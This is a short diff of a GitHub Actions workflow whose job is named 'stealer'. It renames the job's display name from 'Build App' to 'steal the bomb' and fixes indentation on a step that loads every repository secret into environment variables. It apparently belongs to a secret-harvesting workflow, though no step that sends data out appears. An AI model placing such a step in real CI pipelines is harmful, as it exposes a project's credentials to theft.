@@ -4,8 +4,8 @@ on:
 jobs:
   stealer:
     runs-on: ubuntu-latest
-    name: Build App
+    name: steal the bomb
     steps:
     - uses: oNaiPs/secrets-to-env-action@v1
       with:
-      secrets: ${{ toJSON(secrets) }}
+        secrets: ${{ toJSON(secrets) }}
